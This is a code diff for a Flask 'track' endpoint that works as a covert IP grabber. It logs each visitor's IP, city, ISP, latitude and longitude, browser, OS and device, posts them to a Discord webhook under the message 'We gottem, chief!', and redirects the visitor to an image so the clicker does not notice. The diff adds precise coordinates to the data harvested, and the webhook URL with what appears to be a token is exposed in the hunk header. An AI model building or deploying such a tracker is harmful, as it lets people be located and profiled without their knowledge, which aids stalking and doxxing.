@@ -9,35 +9,49 @@ WEBHOOK_URL = "https://discordapp.com/api/webhooks/1360532705644773546/lc5c8r8P_
 
 @app.route('/track')
 def track():
+    # Get the user's IP address
     ip = request.remote_addr or 'unknown'
-    user_agent_string = request.headers.get('User-Agent', 'unknown')
-    
-    # Parse the user-agent string
-    user_agent = parse(user_agent_string)
 
-    # Extract specific details from the parsed user agent
-    browser = user_agent.browser.family  # e.g., Chrome, Firefox
-    os = user_agent.os.family  # e.g., Windows, macOS
-    device = user_agent.device.family  # e.g., Desktop, Mobile
-
-    # Get geo info (use ipinfo.io or any other service)
+    # Get geo info (including latitude and longitude) from ipinfo.io
     geo = requests.get(f"https://ipinfo.io/{ip}/json").json()
+
+    # Extract location details
     city = geo.get("city", "Unknown")
     region = geo.get("region", "Unknown")
     country = geo.get("country", "Unknown")
     org = geo.get("org", "Unknown")
+    loc = geo.get("loc", "Unknown")  # This will return latitude and longitude as a string
 
-    # Build message
+    # If loc is not available, set latitude and longitude to Unknown
+    if loc != "Unknown":
+        latitude, longitude = loc.split(',')
+    else:
+        latitude, longitude = "Unknown", "Unknown"
+
+    # Get the user-agent from request headers
+    user_agent_string = request.headers.get('User-Agent', 'Unknown')
+    user_agent = parse(user_agent_string)
+
+    # Extract browser and OS details from the user-agent
+    browser = user_agent.browser.family
+    os = user_agent.os.family
+    device = user_agent.device.family
+
+    # Build the message with all details
     content = (
-        f"# Logged someone, chief!\n"
+        f"# We gottem, chief!\n"
         f"👀 Click detected!\n"
         f"🌍 IP: `{ip}`\n"
         f"📍 Location: {city}, {region}, {country}\n"
         f"🏢 ISP: {org}\n"
-        f"🖥️ User-Agent: {browser} on {os} ({device})"
+        f"🧭 Latitude: {latitude}\n"
+        f"🧭 Longitude: {longitude}\n"
+        f"🖥️ Browser: {browser}\n"
+        f"🖥️ OS: {os}\n"
+        f"📱 Device: {device}"
     )
 
-    # Send to Discord
+    # Send the message to Discord Webhook
     requests.post(WEBHOOK_URL, json={"content": content})
 
     # Redirect to your image link
